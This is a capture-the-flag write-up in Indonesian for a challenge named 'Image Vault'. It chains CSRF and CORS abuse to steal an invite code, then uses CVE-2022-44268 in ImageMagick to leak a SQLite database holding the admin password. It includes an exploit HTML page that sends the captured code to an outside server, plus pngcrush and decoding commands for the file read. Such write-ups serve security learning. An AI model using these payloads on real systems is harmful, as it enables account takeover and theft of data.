# Image Vault

Chaining: CSRF -> CORS Exploitation -> CVE-2022-44268 -> Admin Login.

1. CSRF Exploitation di API Add Invite Code `/api/add-invite-code`, ini bisa diexploit menggunakan fetch dengan menggunakan option `mode: "no-cors"` dan `credentials: "include"`

2. Selanjutnya CORS Exploitation untuk dapat melihat Invite Code pada API `/api/invite-code/<username>` yang digenerate setelah Add Invite Code, Invite Code ini bisa capture ke server kita agar bisa melanjutkan proses registrasi.

Exploit HTML:
```html
<html>
   <script>
        fetch("https://localhost:1337/api/add-invite-code", {credentials: "include", mode: "no-cors", method: "POST", body: JSON.stringify({"username":"h3h3"})}).then(response =>
            fetch("https://localhost:1337/api/invite-code/h3h3", {credentials: "include"}).then((response) => {
                console.log(response);
                response.json().then((data) => {
                    fetch("https://server/?logs="+data.invite_code.code)
                });
            })
        );
    </script>
</html>
```

3. Registrasi menggunakan username yang sudah di add pada Add Invite Code tadi dan menggunakan Invite Code yang didapatkan

4. Setelah masuk, terdapat vulnerability pada version ImageMagick yang digunakan (CVE-2022-44268). Proses convert ini dilakukan oleh library `cmagick` yang sebenarnya hanya menjalankan subprocess untuk menjalankan command convert.

Vulnerable code:
```py
cmagick.resize(file_path, "75%", file_path)
```

Dikarenakan adanya limitasi file yang di read oleh exploit CVE-2022-44268, dan goals dalam soal ini adalah Admin Login, kita harus bisa membaca file descriptior SQLite yang ada di `/proc/xx/fd/3`. Karena process id ini bersifat random, kita harus melakukan bruteforce sedikit.

```sh
pngcrush -text a "profile" "/proc/12/fd/3" image.png
```

5. Setelah itu upload image yang sudah di generate

6. Download kembali png yang sudah diconver pada /home, untuk mendownloadnyapun bisa gunakan `wget` dengan `--no-check-certificate`.

7. Identify image dengan command

```sh
identify -verbose image.png
```

Dari itu kita mendapatkan hex yang berisi content dari SQLite database pada section Raw Profile Type:

```
    Raw profile type:

   32768
53514c69746520666f726d61742033001000010100402020000000080000000800000000
000000000000000300000004000000000000000000000001000000000000000000000000
000000000000000000000000000000000000000000000008002e862a0d0ff800070ce600
0ee60fcf0dc10eb10e7c0ce60d9600000000000000000000000000000000000000000000
[..snipp..]
```

8. Kita bisa convert menggunakan command:
python3 -c 'print(bytes.fromhex("53514c69746520666f726d61742033001000010100402020000000080000000800000000...").decode("utf-8"))'

9. Read SQLite database yang berisi password admin.

10. Login ke akun admin dengan password yang didapatkan

11. Pergi ke `/flag` untuk mendapatkan flag.


# Ref
- https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC
- https://www.youtube.com/watch?v=KbCR_lkVU5w